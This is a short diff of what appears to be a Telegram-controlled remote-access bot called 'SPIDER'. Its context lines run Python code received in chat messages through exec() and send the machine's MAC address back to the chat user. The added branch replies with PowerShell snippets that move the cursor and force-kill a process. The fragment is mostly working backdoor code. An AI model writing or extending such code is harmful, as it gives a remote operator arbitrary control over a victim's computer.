@@ -141,6 +141,9 @@ def echo_all(message):
             elif "pye " in b:
                 bot.send_message(message.chat.id, "|SPIDER| - PYTHON COMMAND\n``` " + b.split("py")[1][1:] + " ```",parse_mode="Markdown")
                 exec(b.split("py")[1][1:])
+            elif "powershell"==b:
+              bot.send_message(message.chat.id,'powershell.exe Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0,0)')
+              bot.send_message(message.chat.id,'Stop-Process -Name "имя_процесса" -Force')
             elif "CHECK CONNECTION" == b or "/check" == b:
                 mac = ":".join(['{:02X}'.format((uuid.getnode() >> elements) & 0xFF) for elements in range(5, -1, -1)])
                 end = f"Hello {message.from_user.username}, your device is {mac}\!"
